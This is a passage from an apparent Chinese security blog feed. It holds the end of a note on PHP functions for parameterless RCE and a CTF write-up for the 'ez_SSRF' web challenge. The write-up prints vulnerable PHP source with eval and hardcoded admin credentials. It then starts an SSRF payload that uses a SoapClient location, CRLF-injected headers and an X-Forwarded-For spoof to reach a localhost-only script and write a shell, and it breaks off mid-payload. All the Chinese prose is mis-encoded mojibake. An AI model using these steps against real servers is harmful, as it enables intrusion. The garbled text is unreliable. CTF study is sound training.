å…¥å‚æ•°</p><p>**è¿”å›å€¼ï¼š**ä¼šè¿”å›ä¸€ä¸ªåŒ…å«è¯·æ±‚å¤´çš„æ•°ç»„ï¼Œé”®ä¸ºè¯·æ±‚å¤´ï¼Œå€¼ä¸ºè¯·æ±‚å¤´çš„å€¼</p><p>ä¸è¿‡è¿™ä¸ªå‡½æ•°åªèƒ½åœ¨ Apache ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå…¶ä»–ç¯å¢ƒä¸èƒ½ç”¨</p><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416002041599.png" alt="image-20250416002041599"></p><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a><code>get_defined_vars()</code></h3><p>è¿™ä¸ªå‡½æ•°å¯ä»¥è¿”å›æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„æ•°ç»„ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡ã€è¶…å…¨å±€å˜é‡ç­‰</p><p>**ä¼ å…¥å€¼ï¼š**ä¸éœ€è¦ä¼ å…¥å‚æ•°</p><p>**è¿”å›å€¼ï¼š**è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å…³è”æ•°ç»„</p><p>ä¸è¿‡è¿™ä¸ªå‡½æ•°åªèƒ½åœ¨ Apache ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå…¶ä»–ç¯å¢ƒä¸èƒ½ç”¨</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">get_defined_vars</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416161045908.png" alt="image-20250416161045908"></p><h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a><code>session_id()</code></h3><p>è¿™ä¸ªå‡½æ•°å¯ä»¥è·å–æˆ–è®¾ç½®å½“å‰ä¼šè¯çš„ Session ID</p><p>**ä¼ å…¥å€¼ï¼š**ä¸éœ€è¦ä¼ å…¥å‚æ•°</p><p>**è¿”å›å€¼ï¼š**è¿”å›å½“å‰ä¼šè¯çš„ IDï¼Œå¦‚æœæ²¡æœ‰å°±ä¼šè¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">session_id</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416161445970.png" alt="image-20250416161445970"></p><h3 id="è¯»å–æ–‡ä»¶å†…å®¹å‡½æ•°"><a href="#è¯»å–æ–‡ä»¶å†…å®¹å‡½æ•°" class="headerlink" title="è¯»å–æ–‡ä»¶å†…å®¹å‡½æ•°"></a>è¯»å–æ–‡ä»¶å†…å®¹å‡½æ•°</h3><ul><li><code>highlight_file()</code></li><li><code>show_source()</code></li><li><code>readfile()</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>RCE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ— å‚RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024ç¬¬åäº”å±Šæå®¢å¤§æŒ‘æˆ˜--Web-ez_SSRF</title>
    <link href="/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/"/>
    <url>/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/</url>
    
    <content type="html"><![CDATA[<p>é¢˜ç›®æ¥æºï¼š2024ç¬¬åäº”å±Šæå®¢å¤§æŒ‘æˆ˜â€“<code>ez_SSRF</code></p><p><img src="/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250330220602797.png" alt="image-20250330220602797"></p><p>æºç ä¸­å¾—ä¸åˆ°ä»€ä¹ˆä¿¡æ¯ï¼Œç”¨<code>dirsearch</code>æ‰«æç›®å½•</p><p><img src="/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250330220602797.png" alt="image-20250330220645437"></p><p>å¯ä»¥æ‰«å‡º<code>/www.zip</code>æ–‡ä»¶ï¼Œè®¿é—®ä¸‹è½½åˆ°æºç ï¼Œæœ‰å¦‚ä¸‹ä¸‰ä¸ªæ–‡ä»¶</p><p><img src="/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250330220805852.png" alt="image-20250330220805852"></p><p>å…ˆçœ‹çœ‹<code>index.php</code>æ–‡ä»¶ï¼Œä¸è¿‡æ²¡å•¥ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Maybe you should check check some place in my website&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å†çœ‹çœ‹<code>h4d333333.php</code>æ–‡ä»¶ï¼Œæºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// å…³é—­æ‰€æœ‰é”™è¯¯æŠ¥å‘Šï¼Œè¿™æ ·åœ¨ä»£ç è¿è¡Œæ—¶å‡ºç°çš„é”™è¯¯ä¸ä¼šæ˜¾ç¤ºç»™ç”¨æˆ·</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦é€šè¿‡ POST æ–¹æ³•æäº¤äº† &#x27;user&#x27; å‚æ•°</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æäº¤ï¼Œå°†ç”¨æˆ·åè®¾ä¸º &#x27;stranger&#x27;</span><br>    <span class="hljs-variable">$user</span>=<span class="hljs-string">&quot;stranger&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// å¦‚æœæäº¤äº†ï¼Œå°†æäº¤çš„ç”¨æˆ·åèµ‹å€¼ç»™ $user å˜é‡</span><br>    <span class="hljs-variable">$user</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>&#125;<br><span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦é€šè¿‡ GET æ–¹æ³•æäº¤äº† &#x27;location&#x27; å‚æ•°</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;location&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// å¦‚æœæäº¤äº†ï¼Œå°†æäº¤çš„æœåŠ¡åœ°å€èµ‹å€¼ç»™ $location å˜é‡</span><br>    <span class="hljs-variable">$location</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;location&#x27;</span>];<br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ SOAP å®¢æˆ·ç«¯å®ä¾‹</span><br>    <span class="hljs-variable">$client</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<br>        <span class="hljs-comment">// è®¾ç½® SOAP æœåŠ¡çš„åœ°å€</span><br>        <span class="hljs-string">&quot;location&quot;</span>=&gt;<span class="hljs-variable">$location</span>,<br>        <span class="hljs-comment">// è®¾ç½® SOAP æœåŠ¡çš„å‘½åç©ºé—´ï¼Œè¿™é‡Œä¸º &#x27;hahaha&#x27;</span><br>        <span class="hljs-string">&quot;uri&quot;</span>=&gt;<span class="hljs-string">&quot;hahaha&quot;</span>,<br>        <span class="hljs-comment">// è®¾ç½®è¿æ¥ SOAP æœåŠ¡çš„ç”¨æˆ·å</span><br>        <span class="hljs-string">&quot;login&quot;</span>=&gt;<span class="hljs-string">&quot;guest&quot;</span>,<br>        <span class="hljs-comment">// è®¾ç½®è¿æ¥ SOAP æœåŠ¡çš„å¯†ç </span><br>        <span class="hljs-string">&quot;password&quot;</span>=&gt;<span class="hljs-string">&quot;gueeeeest!!!!&quot;</span>,<br>        <span class="hljs-comment">// è®¾ç½® HTTP è¯·æ±‚å¤´ä¸­çš„ User-Agentï¼ŒåŒ…å«ç”¨æˆ·å</span><br>        <span class="hljs-string">&quot;user_agent&quot;</span>=&gt;<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;s Chrome&quot;</span><br>    ));<br>    <span class="hljs-comment">// è°ƒç”¨ SOAP æœåŠ¡ç«¯çš„ calculator æ–¹æ³•</span><br>    <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">calculator</span>();<br>    <span class="hljs-comment">// è¯»å– &#x27;result&#x27; æ–‡ä»¶çš„å†…å®¹å¹¶è¾“å‡º</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;result&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æäº¤ &#x27;location&#x27; å‚æ•°ï¼Œæç¤ºç”¨æˆ·æä¾›</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please give me a location&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç </p><p>POSTä¼ å‚<code>user</code>ï¼Œåˆå§‹ä¼šè¢«èµ‹å€¼ä¸º<code>stranger</code>ï¼ŒGETä¼ å‚<code>location</code>ï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ SOAP å®¢æˆ·ç«¯å®ä¾‹ï¼Œå…¶åœ°å€å°±æ˜¯ GET ä¼ å‚<code>location</code>çš„å€¼ï¼Œå‘½åç©ºé—´ä¸º<code>hahaha</code>ï¼Œè¿æ¥è¿™ä¸ªæœåŠ¡çš„ç”¨æˆ·åæ˜¯<code>guest</code>ï¼Œå¯†ç æ˜¯<code>gueeeeest!!!!</code>ï¼Œè®¾ç½® HTTP è¯·æ±‚å¤´ä¸­çš„ User-Agentï¼ŒåŒ…å«ç”¨æˆ·åï¼Œè¿™é‡Œæ˜¯å°†POSTä¼ å‚<code>user</code>çš„å†…å®¹å’Œ<code>&#39;s Chrome</code>æ‹¼æ¥åˆ°ä¸€èµ·ï¼Œç„¶åè°ƒç”¨ SOAP æœåŠ¡ç«¯çš„ <code>calculator</code> æ–¹æ³•ï¼Œè¯»å–<code>result</code>æ–‡ä»¶çš„å†…å®¹å¹¶è¾“å‡º</p><p>æœ€åå°±æ˜¯æŸ¥çœ‹<code>calculator.php</code>æ–‡ä»¶ï¼Œæºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// å®šä¹‰ç®¡ç†å‘˜ç”¨æˆ·å</span><br><span class="hljs-variable">$admin</span>=<span class="hljs-string">&quot;aaaaaaaaaaaadmin&quot;</span>;<br><span class="hljs-comment">// å®šä¹‰ç®¡ç†å‘˜å¯†ç </span><br><span class="hljs-variable">$adminpass</span>=<span class="hljs-string">&quot;i_want_to_getI00_inMyT3st&quot;</span>;<br><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªç”¨äºæ£€æŸ¥ HTTP è®¤è¯ä¿¡æ¯çš„å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$auth</span></span>) </span>&#123;<br>    <span class="hljs-comment">// å£°æ˜ä½¿ç”¨å…¨å±€å˜é‡ $admin å’Œ $adminpass</span><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$admin</span>,<span class="hljs-variable">$adminpass</span>;<br>    <span class="hljs-comment">// å»é™¤è®¤è¯ä¿¡æ¯ä¸­çš„ &quot;Basic &quot; å‰ç¼€</span><br>    <span class="hljs-variable">$auth</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;Basic &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// å¯¹å»é™¤å‰ç¼€åçš„è®¤è¯ä¿¡æ¯è¿›è¡Œ Base64 è§£ç </span><br>    <span class="hljs-variable">$auth</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// ä½¿ç”¨å†’å·åˆ†å‰²è§£ç åçš„è®¤è¯ä¿¡æ¯ï¼Œå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç </span><br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// è¾“å‡ºç”¨æˆ·åå’Œå¯†ç ï¼Œæ–¹ä¾¿è°ƒè¯•</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$password</span>;<br>    <span class="hljs-comment">// æ£€æŸ¥ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦ä¸ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç åŒ¹é…</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>===<span class="hljs-variable">$admin</span> &amp;&amp; <span class="hljs-variable">$password</span>===<span class="hljs-variable">$adminpass</span>) &#123;<br>        <span class="hljs-comment">// å¦‚æœåŒ¹é…ï¼Œè¿”å› 1</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// å¦‚æœä¸åŒ¹é…ï¼Œè¿”å› 2</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚çš„å®¢æˆ·ç«¯ IP åœ°å€æ˜¯å¦ä¸ºæœ¬åœ°åœ°å€ 127.0.0.1</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-comment">// å¦‚æœä¸æ˜¯æœ¬åœ°åœ°å€ï¼Œè¾“å‡º &quot;Hacker&quot; å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br>&#125;<br><span class="hljs-comment">// è·å– POST è¯·æ±‚ä¸­åä¸º &quot;expression&quot; çš„å‚æ•°å€¼ï¼Œå³è¦è®¡ç®—çš„æ•°å­¦è¡¨è¾¾å¼</span><br><span class="hljs-variable">$expression</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;expression&#x27;</span>];<br><span class="hljs-comment">// è·å– HTTP è¯·æ±‚å¤´ä¸­çš„ &quot;Authorization&quot; å­—æ®µçš„å€¼ï¼Œå³è®¤è¯ä¿¡æ¯</span><br><span class="hljs-variable">$auth</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_AUTHORIZATION&#x27;</span>];<br><span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å­˜åœ¨è®¤è¯ä¿¡æ¯</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$auth</span>))&#123;<br>    <span class="hljs-comment">// è°ƒç”¨ check å‡½æ•°æ£€æŸ¥è®¤è¯ä¿¡æ¯</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$auth</span>)===<span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-comment">// å¦‚æœè®¤è¯å¤±è´¥ï¼ˆè¿”å›å€¼ä¸º 2ï¼‰</span><br>        <span class="hljs-comment">// æ£€æŸ¥è¡¨è¾¾å¼æ˜¯å¦åªåŒ…å«æ•°å­—å’Œå››åˆ™è¿ç®—ç¬¦</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[0-9+\-*\/]+$/&#x27;</span>, <span class="hljs-variable">$expression</span>)) &#123;<br>            <span class="hljs-comment">// å¦‚æœè¡¨è¾¾å¼ä¸ç¬¦åˆè¦æ±‚ï¼Œè¾“å‡º &quot;Invalid expression&quot; å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid expression&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">// å¦‚æœè¡¨è¾¾å¼ç¬¦åˆè¦æ±‚ï¼Œä½¿ç”¨ eval å‡½æ•°è®¡ç®—è¡¨è¾¾å¼çš„å€¼</span><br>            <span class="hljs-variable">$result</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$expression</span>;&quot;</span>);<br>            <span class="hljs-comment">// å°†è®¡ç®—ç»“æœå†™å…¥ &quot;result&quot; æ–‡ä»¶</span><br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;result&quot;</span>,<span class="hljs-variable">$result</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// å¦‚æœè®¤è¯æˆåŠŸï¼ˆè¿”å›å€¼ä¸ä¸º 2ï¼‰</span><br>        <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨ eval å‡½æ•°è®¡ç®—è¡¨è¾¾å¼çš„å€¼</span><br>        <span class="hljs-variable">$result</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$expression</span>;&quot;</span>);<br>        <span class="hljs-comment">// å°†è®¡ç®—ç»“æœå†™å…¥ &quot;result&quot; æ–‡ä»¶</span><br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;result&quot;</span>,<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// å¦‚æœä¸å­˜åœ¨è®¤è¯ä¿¡æ¯ï¼Œè¾“å‡º &quot;Hacker&quot; å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç ï¼ˆç•¥â€¦â€¦åœ¨ä¸Šé¢æºç é‡Œæ³¨é‡Šäº†ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦é€šè¿‡ GET æ–¹æ³•æäº¤äº† &#x27;location&#x27; å‚æ•°</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;location&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// å¦‚æœæäº¤äº†ï¼Œå°†æäº¤çš„æœåŠ¡åœ°å€èµ‹å€¼ç»™ $location å˜é‡</span><br>    <span class="hljs-variable">$location</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;location&#x27;</span>];<br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ SOAP å®¢æˆ·ç«¯å®ä¾‹</span><br>    <span class="hljs-variable">$client</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<br>        <span class="hljs-comment">// è®¾ç½® SOAP æœåŠ¡çš„åœ°å€</span><br>        <span class="hljs-string">&quot;location&quot;</span>=&gt;<span class="hljs-variable">$location</span>,<br>        <span class="hljs-comment">// è®¾ç½® SOAP æœåŠ¡çš„å‘½åç©ºé—´ï¼Œè¿™é‡Œä¸º &#x27;hahaha&#x27;</span><br>        <span class="hljs-string">&quot;uri&quot;</span>=&gt;<span class="hljs-string">&quot;hahaha&quot;</span>,<br>        <span class="hljs-comment">// è®¾ç½®è¿æ¥ SOAP æœåŠ¡çš„ç”¨æˆ·å</span><br>        <span class="hljs-string">&quot;login&quot;</span>=&gt;<span class="hljs-string">&quot;guest&quot;</span>,<br>        <span class="hljs-comment">// è®¾ç½®è¿æ¥ SOAP æœåŠ¡çš„å¯†ç </span><br>        <span class="hljs-string">&quot;password&quot;</span>=&gt;<span class="hljs-string">&quot;gueeeeest!!!!&quot;</span>,<br>        <span class="hljs-comment">// è®¾ç½® HTTP è¯·æ±‚å¤´ä¸­çš„ User-Agentï¼ŒåŒ…å«ç”¨æˆ·å</span><br>        <span class="hljs-string">&quot;user_agent&quot;</span>=&gt;<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;s Chrome&quot;</span><br>    ));<br></code></pre></td></tr></table></figure><p>åœ¨<code>h4d333333.php</code>ä¸­çš„è¿™éƒ¨åˆ†è®¾ç½®äº†ä¸€ç³»åˆ—ä¸œè¥¿ï¼Œå…¶ä¸­æœ‰è®¾ç½® SOAP æœåŠ¡çš„åœ°å€<code>location</code>ï¼Œç„¶åæˆ‘ä»¬åœ¨<code>calculator.php</code>çš„æºç ä¸­å¯ä»¥çœ‹åˆ°æœ‰æ£€æŸ¥è¯·æ±‚å®¢æˆ·ç«¯çš„IPä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚çš„å®¢æˆ·ç«¯ IP åœ°å€æ˜¯å¦ä¸ºæœ¬åœ°åœ°å€ 127.0.0.1</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-comment">// å¦‚æœä¸æ˜¯æœ¬åœ°åœ°å€ï¼Œè¾“å‡º &quot;Hacker&quot; å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å°±å¯ä»¥æƒ³åˆ°SSRFï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>h4d333333.php</code>åˆ›å»ºçš„å®ä¾‹ SOAP æ‰“SSRFå»è®¿é—®<code>calculator.php</code>ï¼ŒæŠŠ<code>location</code>çš„å€¼è®¾ç½®ä¸º<code>127.0.0.1</code>å°±å¯ä»¥ç»•è¿‡å®¢æˆ·ç«¯ IP çš„æ£€æµ‹å»è®¿é—®<code>calculator.php</code>ï¼Œæ‰€ä»¥å°±å¯ä»¥å…ˆæ„é€ å‡ºä»¥ä¸‹<code>payload</code>ï¼Œè¿™é‡Œè¦ç”¨ GET è¯·æ±‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">/h4d333333.php?location=http://127.0.0.1/calculator.php<br></code></pre></td></tr></table></figure><p>åœ¨<code>h4d333333.php</code>ä¸­è¿˜æœ‰ä¸€ä¸ªPOSTè¯·æ±‚çš„å‚æ•°userï¼Œå¯ä»¥åˆ©ç”¨SSRFå†™shellï¼Œè¦POSTæ‰“SSRFçš„è¯ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾éœ€è¦æäº¤å“ªäº›è¯·æ±‚å¤´å’Œå€¼ï¼Œè¦æ³¨æ„æ¯ä¸ªè¯·æ±‚å¤´ä¹‹é—´è¦ç”¨<code>%0d%0a</code>è¿›è¡Œåˆ†éš”å¼€æ¥ï¼Œè¿™ä¸ªæ˜¯å›è½¦ç¬¦ï¼ˆ<code>\r</code>ï¼‰å’Œæ¢è¡Œç¬¦ï¼ˆ<code>\n</code>ï¼‰çš„URLç¼–ç å½¢å¼</p><p>é¦–å…ˆæ˜¯è¦POSTä¼ å‚<code>user</code>çš„ï¼Œå€¼çš„è¯éšä¾¿å¡«å†™ï¼Œä¸æ˜¯ä»€ä¹ˆå¥‡å¥‡æ€ªæ€ªçš„å°±è¡Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">user=abc<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯æ­£å¸¸POSTæ‰“SSRFéœ€è¦çš„è¯·æ±‚å¤´<code>Content-Type</code>ï¼Œä¹‹é—´ç”¨bpæŠ“åŒ…åå¤åˆ¶ç²˜è´´è¿‡æ¥</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br></code></pre></td></tr></table></figure><p>å› ä¸ºä¸Šé¢è¦æ£€æŸ¥å®¢æˆ·ç«¯çš„è¯·æ±‚ IP ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥åŠ ä¸Š<code>X - Forwarded - For: 127.0.0.1</code>æ¥ä¼ªé€ IP</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span 